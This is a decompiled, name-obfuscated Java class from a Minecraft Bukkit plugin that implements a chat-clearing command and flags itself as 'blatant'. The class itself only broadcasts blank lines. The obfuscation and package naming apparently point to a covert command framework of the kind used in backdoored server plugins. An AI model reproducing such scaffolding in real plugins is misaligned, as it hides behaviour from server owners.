/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ClearchatCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllllllIlIIllIIIlllIIl, String lllllllllllllllllIlIIllIIIlllIII, String[] lllllllllllllllllIlIIllIIIllIlll, Player lllllllllllllllllIlIIllIIIllIlIl) {
        for (int lllllllllllllllllIlIIllIIIlllIll = 0; lllllllllllllllllIlIIllIIIlllIll <= 20; ++lllllllllllllllllIlIIllIIIlllIll) {
            Bukkit.broadcastMessage((String)"");
        }
        lllllllllllllllllIlIIllIIIllIlIl.sendMessage(Settings.PREFIX("Chat has been cleared for everyone"));
    }

    public ClearchatCommand() {
        ClearchatCommand lllllllllllllllllIlIIllIIIlllllI;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

